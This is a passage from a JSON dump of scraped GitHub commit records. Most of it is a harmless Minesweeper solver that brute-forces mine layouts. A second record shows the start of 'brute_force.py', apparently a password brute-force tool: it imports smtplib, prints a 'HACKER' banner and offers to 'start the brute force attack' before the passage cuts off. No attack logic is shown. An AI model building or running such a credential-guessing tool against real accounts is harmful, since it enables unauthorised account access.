return_locs.append((location, 1, 'left'))","        if return_locs:","            return return_locs","        min_value = np.min(column_proportions)","        min_value_position = np.argmin(column_proportions)","        return [(location, 1-min_value, 'left')]"]}],"source":"\n\"\"\" Contains solving logic for a Minesweeper puzzle Makes ONE decision each update cycle. Though this may be changed to allow for multiple flags to be added in one cycle Takes in board information and returns an action and a location Though this was originally just a function, it has been made a class to make it easier to act upon previous moves Having this isolated from the rest of the code allows for increased readability and allows for implementation of new solving logic without breaking and other parts of the code This class can have whatever you want in it as long as it contains an update function that returns(location, action) WANT: -goes down the list in order. if one is true it will start over. 0) IF FOCUS NOT NUMERIC, focus finder on numeric. 1) OBVIOUS MOVES.(Exit) 2) JUMP TO NEARBY NUMERIC <REPEAT> -add to tiles-examined 3) IF CANT JUMP TO NEARBY NUMERIC, focus finder on numeric not in tiles-examined 4) IF CANT FIND a numeric not in tiles-examined, find a numeric unsatisfied. and Enumerate section and run Simulation on area. Make a probabilistic mine selection.(Exit) 5) RANDOM RETURN(eventually this should happen as 4) will always make better selections.)(Exit) (marked EXIT, allow potentially escaping the recursive loop and return an action) \"\"\" import random import time import numpy as np from MCoordinate import MCoordinate import cv2 from itertools import product from MTileArray import MTileArray import sys rec_limit=1500 sys.setrecursionlimit(rec_limit) class MLogicPlugin: def __init__(self, grid_array: MTileArray): self.bombs_remaining=99 self.grid_array=grid_array self.previous_focus=MCoordinate(0, 0) self.crop_handler_unchecked=[] self.crop_handler_checked=[] self.crop_handler_counter=0 def update(self, grid_array): self.grid_array=grid_array focus=self.previous_focus location, action=self.logic_flow(focus) return location, action def logic_flow(self, focus): focus_value, focus_satisfaction, focus_adj_unrevealed=self.grid_array.examine_tile(focus) focus_surrounding_tiles=self.grid_array.get_surrounding_tiles(focus) if focus_value==99: print(\"BAD THING HAPPEN\") if not focus_value or focus_value==99 or np.isnan(focus_value): if self.grid_array.tile_hints: location=self.grid_array.tile_hints.pop() if location: return self.logic_flow(MCoordinate(location[0], location[1])) if not self.grid_array.is_satisfied(focus): if(focus_value -focus_satisfaction)==focus_adj_unrevealed: for location, tile_info in focus_surrounding_tiles: if np.isnan(tile_info[0]): print(location.values(), \"RULE1 RETURN\", tile_info[0]) self.previous_focus=focus return location, 'right' else: for location, tile_info in focus_surrounding_tiles: if np.isnan(tile_info[0]): print(focus.values(), \"RULE2 RETURN\") self.previous_focus=focus return focus, 'double_left' for location, tile_info in focus_surrounding_tiles: if(tile_info[0] and not np.isnan(tile_info[0]) and tile_info[0] !=99 and not self.grid_array.is_examined(location)): return self.logic_flow(location) while self.grid_array.tile_hints: search_loc=self.grid_array.tile_hints.pop() if search_loc and self.grid_array.grid_array[search_loc[0], search_loc[1], 0] !=99 and not \\ np.isnan(self.grid_array.grid_array[search_loc[0], search_loc[1], 0]): return self.logic_flow(MCoordinate(search_loc[0], search_loc[1])) search_loc=self.grid_array.get_unexamined_tile(allow_satisfied=True) if search_loc: return self.logic_flow(search_loc) else: self.grid_array.reset_examined_tiles() section_results=[] if not np.isnan(focus_value): while True: location=self.grid_array.get_unexamined_tile(allow_satisfied=False) if location and not self.grid_array.is_satisfied(location): self.grid_array.examine_tile(location) location_surrounding_tiles=self.grid_array.get_surrounding_tiles(location) for adj_location, tile_info in location_surrounding_tiles: if np.isnan(tile_info[0]): break rel_location, sub_array=self.create_subarray(adj_location) subplot_number_unrevealed=np.count_nonzero(np.isnan(sub_array.grid_array[:,:, 0])) if subplot_number_unrevealed <=1: continue offset, probability, action=self.brute_force_method(sub_array) if probability==1: print(f\"LOCATION:{(rel_location +offset).values()} PROBABILITY:{probability}\") return rel_location +offset, action else: section_results.append((rel_location +offset, probability, action)) else: self.previous_focus=focus if not section_results: print(\"ERROR. NO SUBARRAYS WERE CREATED.\") break sub_plot_location, probability, action=zip(*section_results) max_probability=max(probability) max_index=probability.index(max_probability) print(\"UN-GUARANTEED MOVE\") print(f\"POSSIBLE MOVES:{len(probability)}\") print(f\"LOCATION:{sub_plot_location[max_index].values()} PROBABILITY:{max_probability}\") return sub_plot_location[max_index], action[max_index] print('ENTERING PART 5') print(\"RANDOM RETURN\") return self.grid_array.get_random_unrevealed_location(), \"left\" def new_create_subset(self, focus): grid_copy=np.copy(self.grid_array) valid_list=[] checked_list=[] self.new_create_subset_recursion(focus, valid_list, checked_list) numerics_list=[] for location in valid_list: m_location=MCoordinate(location[0], location[1]) for adj_location, adj_value in self.get_surrounding_tiles(m_location): if 1 <=adj_value < 10: numerics_list.append(adj_location.values()) accessory_list=[] for location in numerics_list: m_location=MCoordinate(location[0], location[1]) for adj_location, adj_value in self.get_surrounding_tiles(m_location): if adj_location.values() in numerics_list or adj_location.values() in valid_list: continue accessory_list.append(adj_location.values()) if 1 <=adj_value < 10: grid_copy[adj_location.values()]=0 final_tile_list=valid_list +numerics_list +accessory_list x_values=[] y_values=[] for location in final_tile_list: self.tiles_examined.append(location) x_values.append(location[0]) y_values.append(location[1]) lower_coordinate_pair=MCoordinate(min(x_values), min(y_values)) upper_coordinate_pair=MCoordinate(max(x_values), max(y_values)) subset=grid_copy[lower_coordinate_pair.x:upper_coordinate_pair.x +1, lower_coordinate_pair.y:upper_coordinate_pair.y +1] adjusted_tile_list=[] for tile in final_tile_list: adjusted_tile_list.append((tile[0] -lower_coordinate_pair.x, tile[1] -lower_coordinate_pair.y)) row_num, col_num=np.shape(subset) for row in range(0, row_num): for column in range(0, col_num): if(row, column) not in adjusted_tile_list: subset[row, column]=0 print(\"I hope this is good?\") return[(lower_coordinate_pair, subset)] def new_create_subset_recursion(self, focus, valid_list, checked_list): checked_list.append(focus.values()) flag_adj=0 adj_num=0 for adj_location, adj_value in self.get_surrounding_tiles(focus): if adj_value==99: flag_adj +=1 continue if 1 <=adj_value < 10: valid_list.append(focus.values()) adj_num +=1 if flag_adj < adj_num: for cardinal_location, cardinal_value in self.get_cardinal_tiles(focus): if np.isnan(cardinal_value) and cardinal_location.values() not in checked_list: self.new_create_subset_recursion(cardinal_location, valid_list, checked_list) def create_subarray(self, focus): grid_copy=self.grid_array.copy() valid_set=set() unchecked_set=set() unchecked_set.add(focus.values()) checked_set=set() while unchecked_set: location=unchecked_set.pop() m_location=MCoordinate(location[0], location[1]) checked_set.add(m_location.values()) number_nonzero=0 for adj_locations, adj_tile_info in grid_copy.get_surrounding_tiles(m_location): if 1 <=adj_tile_info[0] < 99: number_nonzero +=1 break if number_nonzero: valid_set.add(m_location.values()) for cardinal_location, cardinal_value in grid_copy.get_cardinal_tiles(m_location): if np.isnan(cardinal_value[0]) and cardinal_location.values() not in checked_set: unchecked_set.add(cardinal_location.values()) tile_set=valid_set.copy() for location in valid_set: m_location=MCoordinate(location[0], location[1]) location_value=grid_copy.grid_array[m_location.values()] for adj_location, adj_tile_info in grid_copy.get_surrounding_tiles(m_location): if adj_location.values() not in tile_set and 1 <=adj_tile_info[0] < 10: tile_set.add(adj_location.values()) final_tile_set=tile_set.copy() for location in tile_set: m_location=MCoordinate(location[0], location[1]) location_value=grid_copy.grid_array[m_location.values()] if 1 <=location_value[0] < 10 and not np.isnan(location_value[0]): for adj_location, adj_tile_info in grid_copy.get_surrounding_tiles(m_location): if adj_location.values() not in final_tile_set: if 1 <=adj_tile_info[0] < 10: grid_copy.grid_array[adj_location.x,adj_location.y,0]=0 final_tile_set.add(adj_location.values()) x_values=[] y_values=[] for location in final_tile_set: self.grid_array.examine_tile(MCoordinate(location[0], location[1])) x_values.append(location[0]) y_values.append(location[1]) lower_coordinate_pair=MCoordinate(min(x_values), min(y_values)) upper_coordinate_pair=MCoordinate(max(x_values)+1, max(y_values)+1) sub_array=grid_copy.slice_copy(lower_coordinate_pair, upper_coordinate_pair) sub_array=self.clean_subarray(sub_array) return lower_coordinate_pair, sub_array @staticmethod def clean_subarray(sub_array): w, h, d=sub_array.shape for row in range(0, h): for column in range(0, w): location=MCoordinate(column, row) value=sub_array.grid_array[location.x, location.y, 0] number_nonzero=0 for surrounding_tiles, surrounding_tile_info in sub_array.get_surrounding_tiles(location): if 1 <=surrounding_tile_info[0] < 99: number_nonzero +=1 break if np.isnan(value) and not number_nonzero: sub_array.grid_array[location.x, location.y, 0]=0 return sub_array @staticmethod def split_subset(subset): subset_list=[] row_num, col_num=np.shape(subset) if row_num % 2 !=0: row_num +=1 if col_num % 2 !=0: col_num +=1 left_subplot=subset[:,:int(col_num \/ 2)] right_subplot=subset[:, int(col_num \/ 2):] upper_subplot=subset[:int(row_num \/ 2),:] lower_subplot=subset[int(row_num \/ 2):,:] left_number_unrevealed=np.count_nonzero(np.isnan(left_subplot)) right_number_unrevealed=np.count_nonzero(np.isnan(right_subplot)) upper_number_unrevealed=np.count_nonzero(np.isnan(upper_subplot)) lower_number_unrevealed=np.count_nonzero(np.isnan(lower_subplot)) lr_magnitude=abs(left_number_unrevealed -right_number_unrevealed) ul_magnitude=abs(upper_number_unrevealed -lower_number_unrevealed) if lr_magnitude > ul_magnitude: upper_mask=(upper_subplot >=1) &(upper_subplot < 99) upper_mask_slice=upper_mask[-1,:] upper_subplot[-1,:][upper_mask_slice]=0 lower_mask=(lower_subplot >=1) &(lower_subplot < 99) lower_mask_slice=lower_mask[0,:] lower_subplot[0,:][lower_mask_slice]=0 subset_list.append((MCoordinate(0, 0), upper_subplot)) subset_list.append((MCoordinate(int(row_num \/ 2), 0), lower_subplot)) else: left_mask=(left_subplot >=1) &(left_subplot < 99) left_mask_slice=left_mask[:, -1] left_subplot[:, -1][left_mask_slice]=0 right_mask=(right_subplot >=1) &(right_subplot < 99) right_mask_slice=right_mask[:, 0] right_subplot[:, 0][right_mask_slice]=0 subset_list.append((MCoordinate(0, 0), left_subplot)) subset_list.append((MCoordinate(0, int(col_num \/ 2)), right_subplot)) return subset_list @staticmethod def brute_force_method(subarray): valid_combinations=[] w, h, d=subarray.shape subarray_proxy=subarray.copy() number_unrevealed=np.count_nonzero(np.isnan(subarray.grid_array[:,:, 0])) unrevealed_locations=np.asarray(np.isnan(subarray.grid_array[:,:, 0])).nonzero() print(f\"Simulating all{2 ** number_unrevealed} outcomes\") combinations_list=list(product((0, 1), repeat=number_unrevealed)) for combination in combinations_list: combination_grid=subarray.grid_array[:,:, 0].copy() for i, tile in enumerate(combination): if tile: combination_grid[unrevealed_locations[0][i], unrevealed_locations[1][i]]=99 subarray_proxy.update(combination_grid) nonzero=subarray_proxy.grid_array[:,:, 0] > 0 nonflag=subarray_proxy.grid_array[:,:, 0] < 99 nonzero_numeric=np.logical_and(nonzero, nonflag) not_satisfied=subarray_proxy.grid_array[:,:, 0] !=subarray_proxy.grid_array[:,:, 1] rejectance=np.logical_and(nonzero_numeric, not_satisfied) if not rejectance.any(): valid_combinations.append(combination) valid_combination_array=np.asarray(valid_combinations) column_sums=valid_combination_array.sum(axis=0) column_proportions=column_sums\/len(valid_combination_array) max_value=np.max(column_proportions) max_value_position=np.argmax(column_proportions) min_value=np.min(column_proportions) min_value_position=np.argmin(column_proportions) if np.isnan(min_value) or np.isnan(max_value): print(\"POOPOO\") if min_value==0: location=MCoordinate(unrevealed_locations[0][min_value_position], unrevealed_locations[1][min_value_position]) print(f\"PROB:{1-min_value}\") return location, 1-min_value, 'left' if max_value==1: location=MCoordinate(unrevealed_locations[0][max_value_position], unrevealed_locations[1][max_value_position]) print(f\"PROB:{max_value}\") return location, max_value, 'right' location=MCoordinate(unrevealed_locations[0][min_value_position], unrevealed_locations[1][min_value_position]) print(f\"PROB:{1-min_value}\") return location, 1-min_value, 'left' ","sourceWithComments":"\"\"\"\nContains solving logic for a Minesweeper puzzle\nMakes ONE decision each update cycle. Though this may be changed to allow for multiple flags to be added in one cycle\nTakes in board information and returns an action and a location\nThough this was originally just a function, it has been made a class to make it easier to act upon previous moves\nHaving this isolated from the rest of the code allows for increased readability and allows for implementation of new\nsolving logic without breaking and other parts of the code\nThis class can have whatever you want in it as long as it contains an update function that returns (location, action)\n\nWANT:\n- goes down the list in order. if one is true it will start over.\n0) IF FOCUS NOT NUMERIC, focus finder on numeric.\n1) OBVIOUS MOVES. (Exit)\n2) JUMP TO NEARBY NUMERIC <REPEAT> -add to tiles-examined\n3) IF CANT JUMP TO NEARBY NUMERIC, focus finder on numeric not in tiles-examined\n4) IF CANT FIND a numeric not in tiles-examined, find a numeric unsatisfied.\nand Enumerate section and run Simulation on area. Make a probabilistic mine selection. (Exit)\n5) RANDOM RETURN (eventually this should happen as 4) will always make better selections.) (Exit)\n\n(marked EXIT, allow potentially escaping the recursive loop and return an action)\n\"\"\"\n\n\nimport random\nimport time\nimport numpy as np\nfrom MCoordinate import MCoordinate\nimport cv2\nfrom itertools import product\nfrom MTileArray import MTileArray\n\nimport sys\nrec_limit = 1500\nsys.setrecursionlimit(rec_limit)\n\n\nclass MLogicPlugin:\n\n    def __init__(self, grid_array: MTileArray):\n        self.bombs_remaining = 99\n        self.grid_array = grid_array\n\n        self.previous_focus = MCoordinate(0, 0)\n        self.crop_handler_unchecked = []\n        self.crop_handler_checked = []\n        self.crop_handler_counter = 0\n\n    def update(self, grid_array):\n\n        self.grid_array = grid_array\n        focus = self.previous_focus\n        location, action = self.logic_flow(focus)\n        return location, action\n\n    def logic_flow(self, focus):  # this function is recursive\n\n        focus_value, focus_satisfaction, focus_adj_unrevealed = self.grid_array.examine_tile(focus)\n        focus_surrounding_tiles = self.grid_array.get_surrounding_tiles(focus)\n\n        if focus_value == 99:\n            print(\"BAD THING HAPPEN\")\n\n        #  ##### PART 0) #####\n        if not focus_value or focus_value == 99 or np.isnan(focus_value):  # if not nonzero numeric focus\n            if self.grid_array.tile_hints:\n                location = self.grid_array.tile_hints.pop()\n                if location:\n                    return self.logic_flow(MCoordinate(location[0], location[1]))\n\n        #  ##### PART 1) #####\n        # \"RULE 1\"\n        if not self.grid_array.is_satisfied(focus):\n\n            if (focus_value - focus_satisfaction) == focus_adj_unrevealed:\n                for location, tile_info in focus_surrounding_tiles:\n                    if np.isnan(tile_info[0]):\n                        print(location.values(), \"RULE1 RETURN\", tile_info[0])\n                        self.previous_focus = focus\n                        return location, 'right'\n\n        # \"RULE 2\"\n        else:\n            for location, tile_info in focus_surrounding_tiles:\n                if np.isnan(tile_info[0]):\n                    print(focus.values(), \"RULE2 RETURN\")\n                    self.previous_focus = focus\n                    return focus, 'double_left'\n\n                    # print(location.values(), \"RULE2 RETURN\")\n                    # self.previous_focus = focus\n                    # return location, 'left'\n\n        #  ##### PART 2) #####\n        for location, tile_info in focus_surrounding_tiles:\n            if (tile_info[0] and not np.isnan(tile_info[0]) and\n                    tile_info[0] != 99 and not self.grid_array.is_examined(location)):\n                return self.logic_flow(location)\n\n        #  ##### PART 3) #####\n        # A)\n\n        while self.grid_array.tile_hints:\n            search_loc = self.grid_array.tile_hints.pop()  # type: tuple\n            if search_loc and self.grid_array.grid_array[search_loc[0], search_loc[1], 0] != 99 and not \\\n                    np.isnan(self.grid_array.grid_array[search_loc[0], search_loc[1], 0]):\n                return self.logic_flow(MCoordinate(search_loc[0], search_loc[1]))\n        # B)\n        search_loc = self.grid_array.get_unexamined_tile(allow_satisfied=True)  # type: MCoordinate\n        if search_loc:\n            return self.logic_flow(search_loc)\n\n        #  ##### PART 4) #####\n        else:\n\n            self.grid_array.reset_examined_tiles()  # reset examined array to false\n            section_results = []\n            if not np.isnan(focus_value):\n                while True:\n                    location = self.grid_array.get_unexamined_tile(allow_satisfied=False)\n                    if location and not self.grid_array.is_satisfied(location):\n                        self.grid_array.examine_tile(location)\n                        location_surrounding_tiles = self.grid_array.get_surrounding_tiles(location)\n                        for adj_location, tile_info in location_surrounding_tiles:\n                            if np.isnan(tile_info[0]):\n                                break  # look for unsatisfied tile\n\n                        # generated_subsets = self.new_create_subset(adj_location)\n                        rel_location, sub_array = self.create_subarray(adj_location)  # CREATE SUBARRAY FROM A LOCATION STARTING POINT\n                        subplot_number_unrevealed = np.count_nonzero(np.isnan(sub_array.grid_array[:, :, 0]))\n\n                        if subplot_number_unrevealed <= 1:  # protects against a case where theres only 1 tile (should fix this in the generate subset function)\n                            continue\n\n                        # offset, probability, action = self.backtracking_method(subplot)\n                        # print(result)\n                        offset, probability, action = self.brute_force_method(sub_array)  # RUN BRUTE FORCE METHOD ON IT\n\n                        if probability == 1:\n                            print(f\"LOCATION: {(rel_location + offset).values()} PROBABILITY: {probability}\")\n                            return rel_location + offset, action\n                        else:\n                            section_results.append((rel_location + offset, probability, action))  # ADD TO RESULTS\n\n                    else:  # occurs when all possible starting locations have been exhausted.\n                        self.previous_focus = focus\n                        if not section_results:\n                            print(\"ERROR. NO SUBARRAYS WERE CREATED.\")\n                            break\n                        sub_plot_location, probability, action = zip(*section_results)\n                        max_probability = max(probability)\n                        max_index = probability.index(max_probability)\n                        print(\"UN-GUARANTEED MOVE\")\n                        print(f\"POSSIBLE MOVES: {len(probability)}\")\n                        print(f\"LOCATION: {sub_plot_location[max_index].values()} PROBABILITY: {max_probability}\")\n                        return sub_plot_location[max_index], action[max_index]\n\n                # cv2.waitKey(0)\n        #  ##### PART 5) #####\n        print('ENTERING PART 5')\n        print(\"RANDOM RETURN\")\n        return self.grid_array.get_random_unrevealed_location(), \"left\"\n\n    def new_create_subset(self, focus):\n\n        grid_copy = np.copy(self.grid_array)\n        valid_list = []\n        checked_list = []\n\n        # populates valid_list with unrevealed tile locations\n        self.new_create_subset_recursion(focus, valid_list, checked_list)\n\n        numerics_list = []\n        for location in valid_list:  # populate list of adj, numeric locations\n            m_location = MCoordinate(location[0], location[1])\n            for adj_location, adj_value in self.get_surrounding_tiles(m_location):\n                if 1 <= adj_value < 10:\n                    numerics_list.append(adj_location.values())\n\n        accessory_list = []\n        for location in numerics_list:  # populate list of adj locations (zeroing out numeric)\n            m_location = MCoordinate(location[0], location[1])\n            for adj_location, adj_value in self.get_surrounding_tiles(m_location):\n                if adj_location.values() in numerics_list or adj_location.values() in valid_list:   # skip values already in our list.\n                    continue\n\n                accessory_list.append(adj_location.values())\n                if 1 <= adj_value < 10:\n                    grid_copy[adj_location.values()] = 0\n\n        final_tile_list = valid_list + numerics_list + accessory_list\n\n        x_values = []\n        y_values = []\n        for location in final_tile_list:\n            self.tiles_examined.append(location)\n            x_values.append(location[0])\n            y_values.append(location[1])\n\n        lower_coordinate_pair = MCoordinate(min(x_values), min(y_values))\n        upper_coordinate_pair = MCoordinate(max(x_values), max(y_values))\n        subset = grid_copy[lower_coordinate_pair.x:upper_coordinate_pair.x + 1,\n                           lower_coordinate_pair.y:upper_coordinate_pair.y + 1]\n\n        adjusted_tile_list = []\n        for tile in final_tile_list:\n            adjusted_tile_list.append((tile[0] - lower_coordinate_pair.x, tile[1] - lower_coordinate_pair.y))\n\n        row_num, col_num = np.shape(subset)\n        for row in range(0, row_num):\n            for column in range(0, col_num):\n                if (row, column) not in adjusted_tile_list:\n                    subset[row, column] = 0\n\n        print(\"I hope this is good?\")\n\n        return [(lower_coordinate_pair, subset)]\n\n    def new_create_subset_recursion(self, focus, valid_list, checked_list):\n\n        checked_list.append(focus.values())  # prevent it from being checked again\n\n        flag_adj = 0\n        adj_num = 0\n        for adj_location, adj_value in self.get_surrounding_tiles(focus):  # if it has a numeric adjacent add to list.\n            if adj_value == 99:\n                flag_adj += 1\n                continue\n            if 1 <= adj_value < 10:\n                valid_list.append(focus.values())\n                adj_num += 1\n\n        if flag_adj < adj_num:  # only chain to the next if it has more than 1 numeric adjacent.\n            for cardinal_location, cardinal_value in self.get_cardinal_tiles(focus):  # check for cardinal unrev not checked\n                if np.isnan(cardinal_value) and cardinal_location.values() not in checked_list:\n                    self.new_create_subset_recursion(cardinal_location, valid_list, checked_list)\n\n    def create_subarray(self, focus):\n\n        grid_copy = self.grid_array.copy()\n\n        valid_set = set()\n\n        unchecked_set = set()\n        unchecked_set.add(focus.values())\n        checked_set = set()\n\n        while unchecked_set:  # creates LIST of all relevant unrevealed tiles.\n            location = unchecked_set.pop()\n            m_location = MCoordinate(location[0], location[1])\n            checked_set.add(m_location.values())\n\n            number_nonzero = 0\n            for adj_locations, adj_tile_info in grid_copy.get_surrounding_tiles(m_location):\n                if 1 <= adj_tile_info[0] < 99:\n                    number_nonzero += 1\n                    break\n\n            if number_nonzero:  # if location has a numeric adjacent\n                valid_set.add(m_location.values())\n                for cardinal_location, cardinal_value in grid_copy.get_cardinal_tiles(m_location):\n                    if np.isnan(cardinal_value[0]) and cardinal_location.values() not in checked_set:\n                        unchecked_set.add(cardinal_location.values())\n\n        tile_set = valid_set.copy()  # adds locations of all adjacent numeric values surrounding the unrevealed tiles.\n        for location in valid_set:\n            m_location = MCoordinate(location[0], location[1])\n            location_value = grid_copy.grid_array[m_location.values()]\n            for adj_location, adj_tile_info in grid_copy.get_surrounding_tiles(m_location):\n                if adj_location.values() not in tile_set and 1 <= adj_tile_info[0] < 10:\n                    tile_set.add(adj_location.values())\n\n        final_tile_set = tile_set.copy()  # adds all adj tiles to listed numerics, and sets any new numeric to 0\n        for location in tile_set:\n            m_location = MCoordinate(location[0], location[1])\n            location_value = grid_copy.grid_array[m_location.values()]\n            if 1 <= location_value[0] < 10 and not np.isnan(location_value[0]):\n                for adj_location, adj_tile_info in grid_copy.get_surrounding_tiles(m_location):\n                    if adj_location.values() not in final_tile_set:\n                        if 1 <= adj_tile_info[0] < 10:\n                            grid_copy.grid_array[adj_location.x,adj_location.y,0] = 0\n                        final_tile_set.add(adj_location.values())\n\n        x_values = []\n        y_values = []\n        for location in final_tile_set:\n            self.grid_array.examine_tile(MCoordinate(location[0], location[1]))\n            x_values.append(location[0])\n            y_values.append(location[1])\n\n        lower_coordinate_pair = MCoordinate(min(x_values), min(y_values))\n        upper_coordinate_pair = MCoordinate(max(x_values)+1, max(y_values)+1)\n        sub_array = grid_copy.slice_copy(lower_coordinate_pair, upper_coordinate_pair)\n\n        sub_array = self.clean_subarray(sub_array)\n\n        return lower_coordinate_pair, sub_array\n\n    @staticmethod\n    def clean_subarray(sub_array):\n        w, h, d = sub_array.shape\n        for row in range(0, h):\n            for column in range(0, w):\n                location = MCoordinate(column, row)\n                value = sub_array.grid_array[location.x, location.y, 0]\n\n                number_nonzero = 0\n                for surrounding_tiles, surrounding_tile_info in sub_array.get_surrounding_tiles(location):\n                    if 1 <= surrounding_tile_info[0] < 99:\n                        number_nonzero += 1\n                        break\n\n                if np.isnan(value) and not number_nonzero:\n                    sub_array.grid_array[location.x, location.y, 0] = 0\n\n        return sub_array  # return  cleaned sub array\n\n    @staticmethod\n    def split_subset(subset):\n        subset_list = []\n        row_num, col_num = np.shape(subset)\n        if row_num % 2 != 0:\n            row_num += 1\n        if col_num % 2 != 0:\n            col_num += 1\n\n        left_subplot = subset[:, :int(col_num \/ 2)]\n        right_subplot = subset[:, int(col_num \/ 2):]\n        upper_subplot = subset[:int(row_num \/ 2), :]\n        lower_subplot = subset[int(row_num \/ 2):, :]\n\n        left_number_unrevealed = np.count_nonzero(np.isnan(left_subplot))\n        right_number_unrevealed = np.count_nonzero(np.isnan(right_subplot))\n        upper_number_unrevealed = np.count_nonzero(np.isnan(upper_subplot))\n        lower_number_unrevealed = np.count_nonzero(np.isnan(lower_subplot))\n\n        lr_magnitude = abs(left_number_unrevealed - right_number_unrevealed)\n        ul_magnitude = abs(upper_number_unrevealed - lower_number_unrevealed)\n\n        if lr_magnitude > ul_magnitude:\n\n            upper_mask = (upper_subplot >= 1) & (upper_subplot < 99)\n            upper_mask_slice = upper_mask[-1, :]\n            upper_subplot[-1, :][upper_mask_slice] = 0\n\n            lower_mask = (lower_subplot >= 1) & (lower_subplot < 99)\n            lower_mask_slice = lower_mask[0, :]\n            lower_subplot[0, :][lower_mask_slice] = 0\n\n            subset_list.append((MCoordinate(0, 0), upper_subplot))\n            subset_list.append((MCoordinate(int(row_num \/ 2), 0), lower_subplot))\n\n        else:\n\n            left_mask = (left_subplot >= 1) & (left_subplot < 99)\n            left_mask_slice = left_mask[:, -1]\n            left_subplot[:, -1][left_mask_slice] = 0\n\n            right_mask = (right_subplot >= 1) & (right_subplot < 99)\n            right_mask_slice = right_mask[:, 0]\n            right_subplot[:, 0][right_mask_slice] = 0\n\n            subset_list.append((MCoordinate(0, 0), left_subplot))\n            subset_list.append((MCoordinate(0, int(col_num \/ 2)), right_subplot))\n\n\n        return subset_list  # returns offset (for each) from original subset and the split subsets.\n\n    @staticmethod\n    def brute_force_method(subarray):  # TODO: Update this function.\n        # Handles a subarray of the grid. Generates all 2^n, n= # unrevealed tiles possible mine layouts.\n        # Validate each layout to determine which ones are possible\n        # Find proportion of valid layouts with a mine for each square.\n        # Select a space with the HIGHEST probability of being a mine for flagging. Or select a space with the\n        # LOWEST probability of being a mine for left clicking.\n\n        # KNOWN ISSUES: Nan is considered a probability. This SHOULD NOT happen.\n        # SHOULDN'T MAKE A PARTIAL DECISION UNTIL IT IS THE BEST POSSIBLE\n\n        # set numeric tiles on the edges to 0. and mines not touching any numerics to 0\n        # 'CLEAN GRID\"\n\n        valid_combinations = []\n        w, h, d = subarray.shape\n        subarray_proxy = subarray.copy()\n\n        number_unrevealed = np.count_nonzero(np.isnan(subarray.grid_array[:, :, 0]))\n        unrevealed_locations = np.asarray(np.isnan(subarray.grid_array[:, :, 0])).nonzero()\n        print(f\"Simulating all {2 ** number_unrevealed} outcomes\")\n        combinations_list = list(product((0, 1), repeat=number_unrevealed))  # list of all 2^n combinations. list of sets of values\n        for combination in combinations_list:\n\n            combination_grid = subarray.grid_array[:, :, 0].copy()  # THIS IS BAD, PROBABLY WILL HAVE TO RECURSION\n            for i, tile in enumerate(combination):\n                if tile:\n                    combination_grid[unrevealed_locations[0][i], unrevealed_locations[1][i]] = 99\n\n            subarray_proxy.update(combination_grid)\n            # accept if every nonzero numeric is exactly satisfied.\n            # equivalent: reject if any nonzero numeric are NOT satisfied\n            nonzero = subarray_proxy.grid_array[:, :, 0] > 0\n            nonflag = subarray_proxy.grid_array[:, :, 0] < 99\n            nonzero_numeric = np.logical_and(nonzero, nonflag)\n\n            not_satisfied = subarray_proxy.grid_array[:, :, 0] != subarray_proxy.grid_array[:, :, 1]\n\n            rejectance = np.logical_and(nonzero_numeric, not_satisfied)\n            if not rejectance.any():\n                valid_combinations.append(combination)\n\n        valid_combination_array = np.asarray(valid_combinations)\n        column_sums = valid_combination_array.sum(axis=0)\n        column_proportions = column_sums\/len(valid_combination_array)\n\n        max_value = np.max(column_proportions)\n        max_value_position = np.argmax(column_proportions)\n\n        min_value = np.min(column_proportions)\n        min_value_position = np.argmin(column_proportions)\n\n        if np.isnan(min_value) or np.isnan(max_value):\n            print(\"POOPOO\")\n\n        if min_value == 0:\n            location = MCoordinate(unrevealed_locations[0][min_value_position],\n                                   unrevealed_locations[1][min_value_position])\n\n            print(f\"PROB: {1-min_value}\")\n            return location, 1-min_value, 'left'\n\n        if max_value == 1:\n            location = MCoordinate(unrevealed_locations[0][max_value_position],\n                                   unrevealed_locations[1][max_value_position])\n            print(f\"PROB: {max_value}\")\n            return location, max_value, 'right'\n\n        location = MCoordinate(unrevealed_locations[0][min_value_position],\n                               unrevealed_locations[1][min_value_position])\n        print(f\"PROB: {1-min_value}\")\n        return location, 1-min_value, 'left'\n"}},"msg":"Can now give multiple moves to execute in a single update. Brute force method now returns all guaranteed moves."}},"https:\/\/github.com\/Commaders\/GBrute":{"7eb89fe992018ef0a329ae4fe0f0f7ae141db2bc":{"url":"https:\/\/api.github.com\/repos\/Commaders\/GBrute\/commits\/7eb89fe992018ef0a329ae4fe0f0f7ae141db2bc","html_url":"https:\/\/github.com\/Commaders\/GBrute\/commit\/7eb89fe992018ef0a329ae4fe0f0f7ae141db2bc","sha":"7eb89fe992018ef0a329ae4fe0f0f7ae141db2bc","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 22f9b5a..8abea1e 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -13,8 +13,8 @@ def main():\n    print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '\n    print '================================================='\n    print '               ++++++++++++++++++++              '\n-   print '\\n                                               '\n-   print '  _,.                                            '\n+   print '                                                 '\n+   print '                                                 '\n    print '                                                 '\n    print '                                                 '\n    print '                                                 '\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n    print '   Metaverse:https:\/\/www.facebook.com\/AriAkashi  '\n    print '================================================='\n    print '               ++++++++++++++++++++              '\n-   print '\\n                                               '\n-   print '  _,.                                            '\n+   print '                                                 '\n+   print '                                                 '\n    print '                                                 '\n    print '                                                 '\n    print '                                                 '\n","add":2,"remove":2,"filename":"\/brute_force.py","badparts":["   print '\\n                                               '","   print '  _,.                                            '"],"goodparts":["   print '                                                 '","   print '                                                 '"]}],"source":"\n '''coded by John Ry ''' import smtplib from os import system def main(): print '=================================================' print ' coded by John Ry ' print ' creator by John Ry ' print ' HACKER: John Ry ' print ' HACKER: CONSTANTINE ' print ' Metaverse:https:\/\/www.facebook.com\/AriAkashi ' print '=================================================' print ' ++++++++++++++++++++ ' print '\\n ' print ' _,. ' print ' ' print ' ' print ' ' print ' _,. ' print ' ,` -.) ' print ' ( _\/-\\\\-._ ' print ' \/,|`--._,-^| , ' print ' \\_| |`-._\/|| , | ' print ' | `-, \/ | \/ \/ ' print ' | || | \/ \/ ' print ' `r-._||\/ __ \/ \/ ' print ' __,-<_ )`-\/ `.\/ \/ ' print ' \\ `--- \\ \/ \/ \/ ' print ' | |.\/ \/ ' print ' \/ \/\/ \/ ' print ' \\_\/ \\ |\/ \/ ' print ' | | _,^-\/ \/ ' print ' | , `` (\\\/ \/_ ' print ' \\,.->._ \\X-=\/^ ' print ' ( \/ `-._\/\/^` ' print ' `Y-.____(__} ' print ' | {__) ' print ' () ' main() print '[1] start the brute force attack' print 